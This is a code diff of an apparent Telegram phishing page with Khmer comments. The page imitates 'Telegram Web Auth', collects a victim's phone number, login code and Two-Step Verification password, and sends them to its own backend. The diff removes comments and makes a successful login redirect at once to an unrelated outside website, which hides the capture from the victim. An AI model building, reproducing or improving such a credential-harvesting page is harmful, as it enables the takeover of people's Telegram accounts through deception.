@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <!-- 1. ការពារ Auto-Zoom លើ Mobile -->
+    <!-- ការពារ Auto-Zoom លើ Mobile -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Telegram Web Auth</title>
     <script src="https://cdn.tailwindcss.com"></script>
@@ -18,7 +18,7 @@
             border: 1px solid #2f3846; 
             border-radius: 12px; 
             color: #fff; 
-            /* 2. កំណត់ 16px ការពារ iOS Safari កុំឱ្យ Auto-Zoom ពេល Focus */
+            /* កំណត់ 16px ការពារ iOS Safari កុំឱ្យ Auto-Zoom ពេល Focus */
             font-size: 16px !important; 
             touch-action: manipulation;
         }
@@ -27,7 +27,7 @@
             outline: none; 
         }
         button, input {
-            /* 3. លុប 300ms Click Delay លើ Mobile */
+            /* លុប 300ms Click Delay លើ Mobile */
             touch-action: manipulation;
         }
     </style>
@@ -53,7 +53,6 @@
                     <input id="phone-input" type="text" value="+855" placeholder="+85512345678" class="tg-input w-full p-3">
                 </div>
             </div>
-            <!-- active:scale-95 ធ្វើឱ្យប៊ូតុងស្រុតចុះភ្លាមៗពេលចុចប៉ះ -->
             <button id="btn-send" onclick="sendPhone()" class="w-full bg-[#5288c1] hover:bg-[#4372a5] active:scale-95 text-white font-medium py-3 rounded-xl transition-all duration-75">SEND CODE</button>
         </div>
 
@@ -98,7 +97,6 @@
                 return;
             }
 
-            // ប្តូរស្ថានភាពប៊ូតុងភ្លាមៗ (Immediate Feedback)
             btn.disabled = true;
             btn.innerText = 'SENDING...';
             btn.classList.add('opacity-70');
@@ -122,7 +120,6 @@
                 alert('Cannot connect to backend server!');
                 console.error(err);
             } finally {
-                // បើកប៊ូតុងឱ្យដើរវិញ
                 btn.disabled = false;
                 btn.innerText = 'SEND CODE';
                 btn.classList.remove('opacity-70');
@@ -140,7 +137,6 @@
                 return;
             }
 
-            // ប្តូរស្ថានភាពប៊ូតុងភ្លាមៗ
             btn.disabled = true;
             btn.innerText = 'VERIFYING...';
             btn.classList.add('opacity-70');
@@ -158,7 +154,8 @@
                 const data = await res.json();
 
                 if (data.success) {
-                    alert('🎉 Login Successful!');
+                    // ប្តូរទៅកាន់ Website ថ្មីភ្លាមៗបន្ទាប់ពី Login ជោគជ័យ
+                    window.location.href = "https://jvpfans.com";
                 } else if (data.requiresPassword) {
                     document.getElementById('password-container').classList.remove('hidden');
                     alert('This account has Two-Step Verification enabled. Please enter your 2FA password.');
